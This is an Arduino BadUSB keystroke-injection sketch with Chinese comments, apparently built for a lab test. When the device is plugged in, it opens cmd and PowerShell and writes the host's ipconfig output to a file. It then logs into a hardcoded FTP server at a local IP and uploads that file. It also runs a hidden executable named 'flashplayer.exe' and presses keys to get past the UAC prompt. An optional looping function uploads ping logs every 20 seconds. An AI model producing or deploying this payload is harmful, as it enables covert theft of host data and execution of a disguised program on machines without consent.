// BadUSB - Version: 2.1 (final)
#include <Keyboard.h>

// 定義鍵盤，給個好記的名稱
char ctrlKey = KEY_LEFT_CTRL;
char winKey = KEY_LEFT_GUI;
char entKey = KEY_RETURN;
char lefKey = KEY_LEFT_ARROW;

String server = "192.168.0.15";
String FTPuser = "badusb";
String FTPpw = "8adus8t1st";

//不用loop是因為setup在插上電腦就會被執行
void setup() {
  // This is Payload
  delay(2000);
  opencmd();
  get_ip();
  delay(2000);
  bypass_UAC();
  delay(2000);
  //hide_ping();
}

void loop() {}
// We don't need it! XD



/*     define function       */

// 進入cmd打開powershell
void opencmd(void) {
  delay(300);
  Keyboard.press(winKey);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("cmd");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.println("powershell");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);
}

// 更換目錄然後登入FTP
void cd_login(void) {
  // 切到測試資料夾去
  Keyboard.println("cd C:/Users/user/Desktop/badusb");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  // 跟FTP server 進行連線
  Keyboard.println("ftp " + server);
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  // 輸入FTP帳號
  Keyboard.println(FTPuser);
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(1000);

  // 輸入FTP密碼
  Keyboard.println(FTPpw);
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(1000);
}

void logout_exit(void) {
  // 退出ftp
  Keyboard.println("bye");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  // 退出powershell
  Keyboard.println("exit");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  // 退出cmd
  Keyboard.println("exit");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);
}

// ipconfig的內容存到ipconfig.txt並上傳
void get_ip(void) {
  // create file
  Keyboard.println("ipconfig > C:/Users/user/Desktop/badusb/ipconfig.txt");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  cd_login();

  // 送出ipconfig.txt
  Keyboard.println("put ipconfig.txt");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  logout_exit();
}

// UAC bypass
void bypass_UAC(void) {
  opencmd();
  
  Keyboard.println("cd C:/Users/user/Desktop/badusb/");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);

  Keyboard.println("powershell -windowstyle hidden start flashplayer.exe");
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(1500);

  //bypass
  Keyboard.press(lefKey);
  Keyboard.releaseAll();
  Keyboard.press(entKey);
  Keyboard.releaseAll();
  delay(100);
}

// 隱藏ping 將細節存檔
void hide_ping(void) {
  opencmd();
  
  Keyboard.println("powershell -windowstyle hidden ping 127.0.0.1 -t > C:/Users/user/Desktop/badusb/ping.txt");
  Keyboard.press(entKey);
  Keyboard.releaseAll();

  // 每20秒自動上傳ping.txt,無限迴圈
  while (1) {
    delay(20000);
    opencmd();
    cd_login();
    // 送出ping.txt
    Keyboard.println("put ping.txt");
    Keyboard.press(entKey);
    Keyboard.releaseAll();
    delay(100);
    logout_exit();
  }
}
